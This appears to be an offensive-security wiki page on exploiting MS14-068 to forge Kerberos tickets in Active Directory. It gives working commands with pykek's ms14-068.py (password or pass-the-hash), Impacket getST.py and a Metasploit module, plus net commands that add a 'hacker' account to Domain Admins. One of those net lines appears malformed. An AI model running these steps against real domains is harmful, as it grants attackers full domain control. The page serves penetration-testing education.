# MS14-068

This vulnerability allows attackers to forge a TGT with unlimited power (i.e. with a modified PAC stating the user is a member of privileged groups). This attack is similar to the [Golden ticket](golden.md), however, it doesn't require the attacker to know the `krbtgt`. This attack is a really powerful privilege escalation technique. However, it will not work on patched domain controllers.

This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14-068](https://github.com/mubix/pykek/blob/master/ms14-068.py) Python script. The script can carry out the attack with a cleartext password or with [pass-the-hash](../../ntlm/pth.md).

Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60)` when trying to use the generated `.ccache` ticket mean the target is patched.

In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed.&#x20;

A TGT can then be obtained with one of the following commands.

```bash
# with a plaintext password
ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'

# with pass-the-hash
ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
```

Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with [pass-the-ticket](../ptt.md). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python).

```bash
getST.py -k -no-pass -spn 'any_valid_spn' $DOMAIN_FQDN/$USER
```

{% hint style="warning" %}
In some scenarios, I personally have had trouble using the `.ccache` ticket on UNIX-like systems. What I did was [convert it](../ptt.md#practice) to `.kirbi`, switch to a Windows system, inject the ticket with mimikatz's `kerberos:ptt` command, and then create a new user and add it to the domain admins group.

```bash
net user "hacker" "132Pentest!!!" /domain /add
net group "Domain Admins" /domain /add
```
{% endhint %}

Metasploit Framework can also be useful in the sense that it prints valuable error information.

```bash
msf6 > use admin/kerberos/ms14_068_kerberos_checksum
```
